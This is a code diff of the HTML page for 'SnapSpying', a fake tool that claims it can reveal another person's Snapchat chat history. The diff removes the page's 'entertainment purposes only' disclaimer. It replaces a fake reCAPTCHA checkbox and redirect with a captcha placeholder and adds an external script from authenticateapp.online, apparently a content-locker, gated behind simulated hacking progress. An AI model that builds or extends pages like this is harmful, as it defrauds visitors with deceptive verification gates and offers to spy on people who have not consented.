@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SnapSpying - Monitor Safely</title>
+    <title>SnapSpying - Private Tool</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -70,26 +70,10 @@
 
             <div onclick="openAction('Chat History', '215,902', 'Reveal Chat History', 'chat')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-comment-dots text-gray-500"></i></div>
-                    <div><h3 class="font-bold text-[15px]">Reveal Chat History</h3><p class="text-[11px] text-gray-500">Message history including sent, received...</p></div>
+                    <div class="w-10 h-10 bg-gray-500/10 flex items-center justify-center rounded-xl"><i class="fas fa-comment-dots text-gray-500 text-xl"></i></div>
+                    <div><h3 class="font-bold text-[15px]">Reveal Chat History</h3><p class="text-[11px] text-gray-500 leading-tight">Message history including sent, received...</p></div>
                 </div>
                 <i class="fas fa-chevron-right text-gray-700 text-xs"></i>
-            </div>
-        </div>
-    </div>
-
-    <div id="privacy-sheet" class="fixed inset-0 z-50 hidden">
-        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" onclick="toggleSheet('privacy-sheet')"></div>
-        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[35px] p-8 sheet h-[85vh] overflow-y-auto">
-            <div class="flex justify-between items-center mb-6">
-                <h2 class="text-xl font-bold">SnapSpying Privacy Policy</h2>
-                <i class="fas fa-times cursor-pointer" onclick="toggleSheet('privacy-sheet')"></i>
-            </div>
-            <div class="space-y-4 text-sm text-gray-400">
-                <div class="bg-black/20 p-5 rounded-2xl">
-                    <h3 class="text-white font-bold mb-2">Information We Collect</h3>
-                    <p>SnapSpying is designed for entertainment purposes only and does not store personal information...</p>
-                </div>
             </div>
         </div>
     </div>
@@ -106,7 +90,7 @@
         </div>
     </div>
 
-    <div id="proc-modal" class="hidden fixed inset-0 z-[60] bg-black/90 flex items-center justify-center p-8">
+    <div id="proc-modal" class="hidden fixed inset-0 z-[60] bg-black/95 flex items-center justify-center p-8">
         <div class="bg-[var(--card)] w-full max-w-sm rounded-[35px] p-8 border border-white/5">
             <div class="flex items-center gap-2 mb-8">
                 <div class="w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
@@ -119,16 +103,15 @@
         </div>
     </div>
 
-    <div id="verify-modal" class="hidden fixed inset-0 z-[70] bg-[#000] flex flex-col items-center justify-center p-8 text-center">
-        <div class="w-20 h-20 bg-[#ffd500]/10 rounded-full flex items-center justify-center mb-8 border border-[#ffd500]/20">
+    <div id="verify-modal" class="hidden fixed inset-0 z-[70] bg-[#000] flex flex-col items-center justify-center p-8 text-center overflow-y-auto">
+        <div class="w-20 h-20 bg-[#ffd500]/10 rounded-full flex items-center justify-center mb-6 border border-[#ffd500]/20">
             <i class="fas fa-lock text-[#ffd500] text-4xl"></i>
         </div>
         <h2 class="text-2xl font-bold mb-2">Verification Required</h2>
-        <p class="text-gray-500 text-sm mb-12">Please complete the security check to continue</p>
-        <div class="bg-white/[0.03] border border-white/10 p-6 rounded-[25px] w-full max-w-xs flex items-center">
-            <input type="checkbox" onchange="finalOffer()" class="w-6 h-6 mr-4 accent-blue-500">
-            <label class="text-sm font-medium">I'm not a robot</label>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" class="w-8 ml-auto">
+        <p class="text-gray-500 text-sm mb-10 px-6">Please complete the captcha to access the final result</p>
+        
+        <div class="w-full max-w-sm">
+            <div data-captcha-enable="true"></div>
         </div>
     </div>
 
@@ -155,7 +138,7 @@
 
             inp.classList.remove('input-error');
             err.classList.add('hidden');
-            btn.innerHTML = '<i class="fas fa-circle-notch animate-spin"></i>';
+            btn.innerHTML = '<i class="fas fa-circle-notch animate-spin text-white"></i>';
             btn.disabled = true;
 
             setTimeout(() => {
@@ -216,13 +199,11 @@
                             document.getElementById('verify-modal').classList.remove('hidden');
                         }, 800);
                     }
-                }, 50);
+                }, 40);
             }, 400);
         }
-
-        function finalOffer() {
-            setTimeout(() => { window.location.href = "YOUR_LINK_HERE"; }, 500);
-        }
     </script>
+
+    <script type="text/javascript" src="https://authenticateapp.online/cp/js/2wx2k"></script>
 </body>
 </html>
